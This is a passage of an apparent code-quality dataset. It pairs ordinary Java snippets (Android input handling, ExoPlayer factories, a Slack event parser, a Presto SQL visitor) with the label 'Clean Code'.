    printTouchEvent(""onUpEvent  :"",x,y,eventTime);
  }
  sTimerProxy.cancelUpdateBatchInputTimer(this);
  if (!sInGesture) {
    if (mCurrentKey != null && mCurrentKey.isModifier()) {
      sPointerTrackerQueue.releaseAllPointersExcept(this,eventTime);
    }
 else {
      sPointerTrackerQueue.releaseAllPointersOlderThan(this,eventTime);
    }
  }
  onUpEventInternal(x,y,eventTime);
  sPointerTrackerQueue.remove(this);
}
",0,Clean Code
"@Override protected void initKeyMapping(){
  super.initKeyMapping();
  Map<Integer,Integer> globalKeyMapping=getKeyMapping();
  globalKeyMapping.remove(KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE);
  globalKeyMapping.remove(KeyEvent.KEYCODE_MEDIA_REWIND);
  globalKeyMapping.remove(KeyEvent.KEYCODE_MEDIA_FAST_FORWARD);
  if (mGeneralData.isRemapFastForwardToNextEnabled()) {
    globalKeyMapping.put(KeyEvent.KEYCODE_MEDIA_FAST_FORWARD,KeyEvent.KEYCODE_MEDIA_NEXT);
    globalKeyMapping.put(KeyEvent.KEYCODE_MEDIA_REWIND,KeyEvent.KEYCODE_MEDIA_PREVIOUS);
  }
  if (mGeneralData.isRemapNextToFastForwardEnabled()) {
    globalKeyMapping.put(KeyEvent.KEYCODE_MEDIA_NEXT,KeyEvent.KEYCODE_MEDIA_FAST_FORWARD);
    globalKeyMapping.put(KeyEvent.KEYCODE_MEDIA_PREVIOUS,KeyEvent.KEYCODE_MEDIA_REWIND);
  }
  if (mGeneralData.isRemapPageUpToNextEnabled()) {
    globalKeyMapping.put(KeyEvent.KEYCODE_PAGE_UP,KeyEvent.KEYCODE_MEDIA_NEXT);
    globalKeyMapping.put(KeyEvent.KEYCODE_PAGE_DOWN,KeyEvent.KEYCODE_MEDIA_PREVIOUS);
  }
  if (mGeneralData.isRemapChannelUpToNextEnabled()) {
    globalKeyMapping.put(KeyEvent.KEYCODE_CHANNEL_UP,KeyEvent.KEYCODE_MEDIA_NEXT);
    globalKeyMapping.put(KeyEvent.KEYCODE_CHANNEL_DOWN,KeyEvent.KEYCODE_MEDIA_PREVIOUS);
  }
  if (!PlaybackPresenter.instance(mContext).isInPipMode() && mGeneralData.isRemapPlayToOKEnabled()) {
    globalKeyMapping.put(KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE,KeyEvent.KEYCODE_DPAD_CENTER);
  }
 else {
    globalKeyMapping.remove(KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE);
  }
  globalKeyMapping.put(KeyEvent.KEYCODE_DEL,KeyEvent.KEYCODE_0);
}",0,Clean Code
"/** 
 * Changes number of visible items showing in a column when it's not activated.  The default value is 1.
 * @param pickerItems Number of visible items showing in a column when it's not activated.
 */
public void setVisibleItemCount(float pickerItems){
  if (pickerItems <= 0) {
    throw new IllegalArgumentException();
  }
  if (mVisibleItems != pickerItems) {
    mVisibleItems=pickerItems;
    if (!isActivated()) {
      updateColumnSize();
    }
  }
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof RogueMiracle)) {
    return false;
  }
  RogueMiracle other=(RogueMiracle)o;
  return bitField0_ == other.bitField0_ && (!hasNKBEHFHLPEF() || nKBEHFHLPEF == other.nKBEHFHLPEF) && (!hasMMFONFFPNJM() || mMFONFFPNJM == other.mMFONFFPNJM) && (!hasMiracleId() || miracleId == other.miracleId) && (!hasKONAGCDHKKH() || kONAGCDHKKH.equals(other.kONAGCDHKKH));
}
@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof KONAGCDHKKHEntry)) {
    return false;
  }
  KONAGCDHKKHEntry other=(KONAGCDHKKHEntry)o;
  return bitField0_ == other.bitField0_ && (!hasKey() || key == other.key) && (!hasValue() || value_ == other.value_);
}",0,Clean Code
"/** 
 * Creates a new factory for  {@link ExtractorMediaSource}s.
 * @param dataSourceFactory A factory for {@link DataSource}s to read the media.
 */
public Factory(DataSource.Factory dataSourceFactory){
  this.dataSourceFactory=dataSourceFactory;
  loadErrorHandlingPolicy=new DefaultLoadErrorHandlingPolicy();
  continueLoadingCheckIntervalBytes=DEFAULT_LOADING_CHECK_INTERVAL_BYTES;
}
/** 
 * Creates a new factory for  {@link ProgressiveMediaSource}s, using the extractors provided by {@link DefaultExtractorsFactory}.
 * @param dataSourceFactory A factory for {@link DataSource}s to read the media.
 */
public Factory(DataSource.Factory dataSourceFactory){
  this(dataSourceFactory,new DefaultExtractorsFactory());
}
/** 
 * Creates a new factory for  {@link ProgressiveMediaSource}s.
 * @param dataSourceFactory A factory for {@link DataSource}s to read the media.
 * @param extractorsFactory A factory for extractors used to extract media from its container.
 */
public Factory(DataSource.Factory dataSourceFactory,ExtractorsFactory extractorsFactory){
  this.dataSourceFactory=dataSourceFactory;
  this.extractorsFactory=extractorsFactory;
  loadErrorHandlingPolicy=new DefaultLoadErrorHandlingPolicy();
  continueLoadingCheckIntervalBytes=DEFAULT_LOADING_CHECK_INTERVAL_BYTES;
}
/** 
 * Creates a factory for  {@link SingleSampleMediaSource}s.
 * @param dataSourceFactory The factory from which the {@link DataSource} to read the media willbe obtained.
 */
public Factory(DataSource.Factory dataSourceFactory){
  this.dataSourceFactory=Assertions.checkNotNull(dataSourceFactory);
  loadErrorHandlingPolicy=new DefaultLoadErrorHandlingPolicy();
}
",0,Clean Code
"/** 
 * Constructs a new exception with null as its detail message.
 */
public InstanceException(){
  super();
}
/** 
 * Constructs a new exception with the specified detail message.<br> The cause is not initialized, and may subsequently be initialized by a call to  {@link #initCause}.
 * @param message the detail message. The detail message is saved for later retrieval by the {@link #getMessage()} method.
 */
public InstanceException(String message){
  super(message);
}
/** 
 * Constructs a new exception with the specified detail message and cause.<br><br> Note that the detail message associated with cause is not automatically incorporated in this exception's detail message.
 * @param message the detail message (which is saved for later retrieval by the {@link #getMessage()} method).
 * @param cause the cause (which is saved for later retrieval by the {@link #getCause()} method). (A null value is permitted, and indicates that the cause is nonexistent or unknown.)
 */
public InstanceException(String message,Throwable cause){
  super(message,cause);
}
/** 
 * Constructs a new exception with the specified cause and a detail message of (cause==null ? null : cause.toString()) (which typically contains the class and detail message of cause).<br> This constructor is useful for exceptions that are little more than wrappers for other throwables (for example,  {@link java.security.PrivilegedActionException}).
 * @param cause the cause (which is saved for later retrieval by the {@link #getCause()} method). (A null value is permitted, and indicates that the cause is nonexistent or unknown.)
 */
public InstanceException(Throwable cause){
  super(cause);
}
",0,Clean Code
"/** 
 * @param dataSource The source from which the data should be loaded.
 * @param dataSpec Defines the data to be loaded.
 * @param trackFormat See {@link #trackFormat}.
 * @param trackSelectionReason See {@link #trackSelectionReason}.
 * @param trackSelectionData See {@link #trackSelectionData}.
 * @param startTimeUs The start time of the media contained by the chunk, in microseconds.
 * @param endTimeUs The end time of the media contained by the chunk, in microseconds.
 * @param chunkIndex The index of the chunk, or {@link C#INDEX_UNSET} if it is not known.
 */
public MediaChunk(DataSource dataSource,DataSpec dataSpec,Format trackFormat,int trackSelectionReason,Object trackSelectionData,long startTimeUs,long endTimeUs,long chunkIndex){
  super(dataSource,dataSpec,C.DATA_TYPE_MEDIA,trackFormat,trackSelectionReason,trackSelectionData,startTimeUs,endTimeUs);
  Assertions.checkNotNull(trackFormat);
  this.chunkIndex=chunkIndex;
}
",0,Clean Code
"@Override public void onMetadataChanged(PlayerAdapter wrapper){
  PlaybackBaseControlGlue.this.onMetadataChanged();
}
/** 
 * Event when metadata changed
 */
protected void onMetadataChanged(){
  if (mControlsRow == null) {
    return;
  }
  if (DEBUG)   Log.v(TAG,""updateRowMetadata"");
  mControlsRow.setImageDrawable(getArt());
  mControlsRow.setDuration(getDuration());
  mControlsRow.setCurrentPosition(getCurrentPosition());
  if (getHost() != null) {
    getHost().notifyPlaybackRowChanged();
  }
}
",0,Clean Code
"public ParseResult parse(final String rawJson){
  final Map<String,Object> requestMap=JSONSerDeUtils.deserializeJson(rawJson,new TypeReference<>(){
  }
);
  final String eventType=(String)requestMap.get(""type"");
  if (StringUtils.equals(eventType,""url_verification"")) {
    return ParseResult.builder().type(ParseResult.ParseResultType.CHALLENGE).ack(ParseResult.HttpAck.builder().httpStatus(HttpStatus.OK).body((String)requestMap.get(""challenge"")).build()).build();
  }
  if (!StringUtils.equals(eventType,""event_callback"")) {
    return ParseResult.builder().type(ParseResult.ParseResultType.FILTER).filterMessage(""Unknown Slack event type: %s"".formatted(eventType)).build();
  }
  final Map<String,Object> rawEvent=(Map<String,Object>)requestMap.get(""event"");
  if (rawEvent == null) {
    return ParseResult.builder().type(ParseResult.ParseResultType.ERROR).errorMessage(""Slack event has a broken payload: %s"".formatted(rawJson)).build();
  }
  final String innerEventType=(String)rawEvent.get(""type"");
  if (!""message"".equals(innerEventType)) {
    return ParseResult.builder().type(ParseResult.ParseResultType.FILTER).filterMessage(""Unknown Slack event inner type: %s"".formatted(innerEventType)).build();
  }
  final String messageSubtype=(String)rawEvent.get(""subtype"");
  if (messageSubtype == null) {
    final MessageEvent messageEvent=GsonHelper.fromJson(JSONSerDeUtils.serializeJson(requestMap.get(""event"")),MessageEvent.class);
    if (messageEvent.getThreadTs() == null) {
      return ParseResult.builder().type(ParseResult.ParseResultType.FILTER).filterMessage(""Slack message event is not a thread reply: %s"".formatted(messageEvent)).build();
    }
    return ParseResult.builder().type(ParseResult.ParseResultType.PAYLOAD).messageEvent(MessageEventRequest.builder().event(messageEvent).action(MessageEventActionDto.CREATE).provider(MessageProviderDto.SLACK).build()).build();
  }
  if (""message_changed"".equals(messageSubtype)) {
    final MessageChangedEvent messageEvent=GsonHelper.fromJson(JSONSerDeUtils.serializeJson(requestMap.get(""event"")),MessageChangedEvent.class);
    if (messageEvent.getMessage().getThreadTs() == null) {
      return ParseResult.builder().type(ParseResult.ParseResultType.FILTER).filterMessage(""Slack message is not a thread reply: %s"".formatted(messageEvent)).build();
    }
    return ParseResult.builder().type(ParseResult.ParseResultType.PAYLOAD).messageEvent(MessageEventRequest.builder().event(messageEvent).action(MessageEventActionDto.UPDATE).provider(MessageProviderDto.SLACK).build()).build();
  }
  return ParseResult.builder().type(ParseResult.ParseResultType.FILTER).filterMessage(""Couldn't handle Slack event: %s"".formatted(rawJson)).build();
}
",0,Clean Code
"public static String limitTypeToServerString(int type){
switch (type) {
case TYPE_PIN_DIALOGS:
    return ""double_limits__dialog_pinned"";
case TYPE_TO0_MANY_COMMUNITIES:
  return ""double_limits__channels"";
case TYPE_PUBLIC_LINKS:
return ""double_limits__channels_public"";
case TYPE_FOLDERS:
return ""double_limits__dialog_filters"";
case TYPE_CHATS_IN_FOLDER:
return ""double_limits__dialog_filters_chats"";
case TYPE_LARGE_FILE:
return ""double_limits__upload_max_fileparts"";
case TYPE_CAPTION:
return ""double_limits__caption_length"";
case TYPE_GIFS:
return ""double_limits__saved_gifs"";
case TYPE_STICKERS:
return ""double_limits__stickers_faved"";
case TYPE_FOLDER_INVITES:
return ""double_limits__chatlist_invites"";
case TYPE_SHARED_FOLDERS:
return ""double_limits__chatlists_joined"";
}
return null;
}",0,Clean Code
"/** 
 * Writes a byte array to a binary file.
 * @param file The file to write to.
 * @param data The data to write.
 * @throws IOException
 */
public static void writeBinaryFile(final File file,final byte[] data) throws IOException {
  final FileOutputStream fos=new FileOutputStream(file);
  try {
    fos.write(data);
  }
  finally {
    fos.close();
  }
}
",0,Clean Code
"private void visit(PrestoJoin join){
  visit(join.getLeftTable());
  sb.append("" "");
  sb.append(join.getJoinType());
  sb.append("" "");
  if (join.getOuterType() != null) {
    sb.append(join.getOuterType());
  }
  sb.append("" JOIN "");
  visit(join.getRightTable());
  if (join.getOnCondition() != null) {
    sb.append("" ON "");
    visit(join.getOnCondition());
  }
}
private void visit(PrestoConstant constant){
  sb.append(constant.toString());
}
private void visit(PrestoAtTimeZoneOperator timeZoneOperator){
  visit(timeZoneOperator.getExpr());
  sb.append("" AT TIME ZONE "");
  sb.append(timeZoneOperator.getTimeZone());
}
private void visit(PrestoFunctionWithoutParenthesis prestoFunctionWithoutParenthesis){
  sb.append(prestoFunctionWithoutParenthesis.getExpr());
}
private void visit(PrestoSelect select){
  sb.append(""SELECT "");
  if (select.isDistinct()) {
    sb.append(""DISTINCT "");
  }
  visit(select.getFetchColumns());
  sb.append("" FROM "");
  visit(select.getFromList());
  if (!select.getFromList().isEmpty() && !select.getJoinList().isEmpty()) {
    sb.append("", "");
  }
  if (!select.getJoinList().isEmpty()) {
    visit(select.getJoinList());
  }
  if (select.getWhereClause() != null) {
    sb.append("" WHERE "");
    visit(select.getWhereClause());
  }
  if (!select.getGroupByExpressions().isEmpty()) {
    sb.append("" GROUP BY "");
    visit(select.getGroupByExpressions());
  }
  if (select.getHavingClause() != null) {
    sb.append("" HAVING "");
    visit(select.getHavingClause());
  }
  if (!select.getOrderByClauses().isEmpty()) {
    sb.append("" ORDER BY "");
    visit(select.getOrderByClauses());
  }
  if (select.getLimitClause() != null) {
    sb.append("" LIMIT "");
    visit(select.getLimitClause());
  }
  if (select.getOffsetClause() != null) {
    sb.append("" OFFSET "");
    visit(select.getOffsetClause());
  }
}
public void visit(PrestoCastFunction cast){
  sb.append(""CAST(("");
  visit(cast.getExpr());
  sb.append("") AS "");
  sb.append(cast.getType().toString());
  sb.append("")"");
}
public void visit(PrestoMultiValuedComparison comp){
  sb.append(""("");
  visit(comp.getLeft());
  sb.append("" "");
  sb.append(comp.getOp().getStringRepresentation());
  sb.append("" "");
  sb.append(comp.getType());
  sb.append("" (VALUES "");
  visit(comp.getRight());
  sb.append("")"");
  sb.append("")"");
}
public void visit(PrestoQuantifiedComparison comp){
  sb.append(""("");
  visit(comp.getLeft());
  sb.append("" "");
  sb.append(comp.getOp().getStringRepresentation());
  sb.append("" "");
  sb.append(comp.getType());
  sb.append("" ( "");
  visit(comp.getRight());
  sb.append("" ) "");
  sb.append("")"");
}
",0,Clean Code
